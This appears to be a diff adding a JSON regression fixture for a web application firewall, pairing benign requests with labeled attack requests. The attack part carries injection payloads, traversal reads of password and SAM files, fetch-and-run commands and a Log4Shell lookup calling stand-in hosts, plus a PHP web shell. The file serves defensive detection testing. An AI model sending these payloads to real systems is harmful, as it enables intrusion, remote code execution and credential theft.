@@ -1,0 +1,401 @@
+{
+  "source": "OWASP CRS 4.14 regression tests (tests/regression) plus documented payloads",
+  "notes": "Ground truth is the decision of the pinned native Coraza sidecar with the vendored CRS bundle at PL1; the `family` field is only a label.",
+  "benign": [
+    {
+      "name": "search-form",
+      "method": "GET",
+      "uri": "/search?q=wireless+headphones&page=2&sort=price_asc",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": ""
+    },
+    {
+      "name": "login-form",
+      "method": "POST",
+      "uri": "/login",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "username=alice&password=correct-horse-battery-staple&remember=1"
+    },
+    {
+      "name": "login-json",
+      "method": "POST",
+      "uri": "/api/login",
+      "content_type": "application/json",
+      "body": "{\"username\":\"alice\",\"password\":\"s3cret\",\"remember\":true}"
+    },
+    {
+      "name": "product-json",
+      "method": "POST",
+      "uri": "/api/cart",
+      "content_type": "application/json",
+      "body": "{\"id\":42,\"name\":\"Running Shoes\",\"price\":89.99,\"tags\":[\"sport\",\"sale\"]}"
+    },
+    {
+      "name": "article-text",
+      "method": "POST",
+      "uri": "/articles",
+      "content_type": "text/plain",
+      "body": "The quick brown fox jumps over the lazy dog. A short article about hiking in the mountains, packing light and leaving no trace."
+    },
+    {
+      "name": "contact-form",
+      "method": "POST",
+      "uri": "/contact",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "name=John+Doe&email=john%40example.com&message=Hello%2C+I+would+like+a+quote+for+three+units."
+    },
+    {
+      "name": "review-form",
+      "method": "POST",
+      "uri": "/reviews",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "title=Great+product&rating=5&comment=Works+as+described.+Would+buy+again."
+    },
+    {
+      "name": "upload-text",
+      "method": "POST",
+      "uri": "/upload",
+      "content_type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
+      "body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"notes.txt\"\r\nContent-Type: text/plain\r\n\r\nShopping list: milk, bread, coffee, apples.\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n"
+    },
+    {
+      "name": "json-unicode",
+      "method": "POST",
+      "uri": "/api/profile",
+      "content_type": "application/json",
+      "body": "{\"city\":\"M\\u00fcnchen\",\"note\":\"caf\\u00e9 near the river\",\"active\":true}"
+    },
+    {
+      "name": "xml-order",
+      "method": "POST",
+      "uri": "/api/order",
+      "content_type": "application/xml",
+      "body": "<?xml version=\"1.0\"?><order><item id=\"1\">Widget</item><qty>3</qty></order>"
+    },
+    {
+      "name": "german-prose",
+      "method": "POST",
+      "uri": "/comments",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "payload=Ihre+kleine+Schwester+ist+ein+sch%C3%B6nes+Beispiel+f%C3%BCr+die+deutsche+Sprache."
+    },
+    {
+      "name": "french-prose",
+      "method": "POST",
+      "uri": "/comments",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "payload=Le+petit+chat+dort+sur+le+canap%C3%A9+et+r%C3%AAve+des+poissons+du+lac."
+    },
+    {
+      "name": "encoded-search",
+      "method": "GET",
+      "uri": "/search?q=%E2%82%AC+price+comparison&lang=en",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": ""
+    },
+    {
+      "name": "csv-upload",
+      "method": "POST",
+      "uri": "/import",
+      "content_type": "text/csv",
+      "body": "name,quantity,price\nwidget,3,9.99\ngadget,1,24.50\n"
+    },
+    {
+      "name": "base64-upload",
+      "method": "POST",
+      "uri": "/api/assets",
+      "content_type": "application/json",
+      "body": "{\"name\":\"logo.png\",\"data\":\"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==\"}"
+    }
+  ],
+  "attacks": [
+    {
+      "name": "sqli-classic",
+      "family": "942",
+      "method": "POST",
+      "uri": "/login",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "username=admin' OR '1'='1&password=x"
+    },
+    {
+      "name": "sqli-union",
+      "family": "942",
+      "method": "POST",
+      "uri": "/search",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "q=1 UNION SELECT username,password FROM users"
+    },
+    {
+      "name": "sqli-time",
+      "family": "942",
+      "method": "POST",
+      "uri": "/item",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "id=1;WAITFOR DELAY '0:0:5'--"
+    },
+    {
+      "name": "sqli-sleep",
+      "family": "942",
+      "method": "POST",
+      "uri": "/item",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "id=1' AND SLEEP(5)--"
+    },
+    {
+      "name": "sqli-error",
+      "family": "942",
+      "method": "POST",
+      "uri": "/item",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "id=1 AND extractvalue(1,concat(0x7e,version()))"
+    },
+    {
+      "name": "sqli-urlencoded",
+      "family": "942",
+      "method": "POST",
+      "uri": "/item",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "q=%27+OR+%271%27%3D%271"
+    },
+    {
+      "name": "xss-script",
+      "family": "941",
+      "method": "POST",
+      "uri": "/comment",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "comment=<script>alert('XSS')</script>"
+    },
+    {
+      "name": "xss-img",
+      "family": "941",
+      "method": "POST",
+      "uri": "/comment",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "q=<img src=x onerror=alert(1)>"
+    },
+    {
+      "name": "xss-js-uri",
+      "family": "941",
+      "method": "POST",
+      "uri": "/profile",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "url=javascript:alert(document.cookie)"
+    },
+    {
+      "name": "xss-svg",
+      "family": "941",
+      "method": "POST",
+      "uri": "/comment",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "q=%3Csvg%2Fonload%3Dalert(1)%3E"
+    },
+    {
+      "name": "xss-iframe",
+      "family": "941",
+      "method": "POST",
+      "uri": "/comment",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "name=<iframe src=\"javascript:alert(1)\">"
+    },
+    {
+      "name": "lfi-passwd",
+      "family": "930",
+      "method": "POST",
+      "uri": "/download",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "file=../../../../etc/passwd"
+    },
+    {
+      "name": "lfi-shadow",
+      "family": "930",
+      "method": "POST",
+      "uri": "/download",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "path=..%2f..%2f..%2fetc%2fshadow"
+    },
+    {
+      "name": "lfi-php-filter",
+      "family": "930",
+      "method": "POST",
+      "uri": "/download",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "page=php://filter/convert.base64-encode/resource=index.php"
+    },
+    {
+      "name": "lfi-windows",
+      "family": "930",
+      "method": "POST",
+      "uri": "/download",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "file=C:\\Windows\\System32\\config\\SAM"
+    },
+    {
+      "name": "rfi-http",
+      "family": "931",
+      "method": "POST",
+      "uri": "/include",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "url=http://evil.example/shell.php"
+    },
+    {
+      "name": "rfi-https",
+      "family": "931",
+      "method": "POST",
+      "uri": "/include",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "include=https://attacker.example/backdoor.txt?"
+    },
+    {
+      "name": "rce-cat",
+      "family": "932",
+      "method": "POST",
+      "uri": "/run",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "cmd=;cat /etc/passwd"
+    },
+    {
+      "name": "rce-subshell",
+      "family": "932",
+      "method": "POST",
+      "uri": "/run",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "cmd=$(id)"
+    },
+    {
+      "name": "rce-backtick",
+      "family": "932",
+      "method": "POST",
+      "uri": "/run",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "cmd=`id`"
+    },
+    {
+      "name": "rce-wget",
+      "family": "932",
+      "method": "POST",
+      "uri": "/run",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "cmd=;wget http://evil.example/x.sh"
+    },
+    {
+      "name": "rce-powershell",
+      "family": "932",
+      "method": "POST",
+      "uri": "/run",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "cmd=|powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil/x')"
+    },
+    {
+      "name": "rce-ifs",
+      "family": "932",
+      "method": "POST",
+      "uri": "/run",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "var=0.84622338492032948`echo${IFS}crs312``echo${IFS}34test`"
+    },
+    {
+      "name": "php-system",
+      "family": "933",
+      "method": "POST",
+      "uri": "/index.php",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "code=<?php system($_GET['c']); ?>"
+    },
+    {
+      "name": "php-eval",
+      "family": "933",
+      "method": "POST",
+      "uri": "/index.php",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "func=eval(base64_decode('cGhwaW5mbygpOw=='))"
+    },
+    {
+      "name": "php-input",
+      "family": "933",
+      "method": "POST",
+      "uri": "/index.php",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "var=php://input"
+    },
+    {
+      "name": "java-runtime",
+      "family": "944",
+      "method": "POST",
+      "uri": "/api",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "test=java.lang.Runtime"
+    },
+    {
+      "name": "java-processbuilder",
+      "family": "944",
+      "method": "POST",
+      "uri": "/api",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "test=java.lang.ProcessBuilder"
+    },
+    {
+      "name": "log4shell",
+      "family": "944",
+      "method": "POST",
+      "uri": "/api",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "test=${jndi:ldap://evil.example/a}"
+    },
+    {
+      "name": "ssti-jinja",
+      "family": "934",
+      "method": "POST",
+      "uri": "/render",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "q={{7*7}}"
+    },
+    {
+      "name": "ssrf-metadata",
+      "family": "934",
+      "method": "POST",
+      "uri": "/fetch",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "url=http://169.254.169.254/latest/meta-data/"
+    },
+    {
+      "name": "ssrf-decimal",
+      "family": "934",
+      "method": "POST",
+      "uri": "/fetch",
+      "content_type": "application/xml",
+      "body": "<?xml version=\"1.0\"?><xml><ssrf>http://2852039166/</ssrf></xml>"
+    },
+    {
+      "name": "generic-ssi",
+      "family": "934",
+      "method": "POST",
+      "uri": "/page",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "data=<!--#exec cmd=\"id\" -->"
+    },
+    {
+      "name": "generic-jsp",
+      "family": "934",
+      "method": "POST",
+      "uri": "/page",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "payload=<%= 7*7 %>"
+    },
+    {
+      "name": "php-object-injection",
+      "family": "933",
+      "method": "POST",
+      "uri": "/index.php",
+      "content_type": "application/x-www-form-urlencoded",
+      "body": "data=O:8:\"stdClass\":1:{s:1:\"a\";s:1:\"b\";}"
+    },
+    {
+      "name": "xxe",
+      "family": "930",
+      "method": "POST",
+      "uri": "/xml",
+      "content_type": "application/xml",
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>"
+    }
+  ]
+}
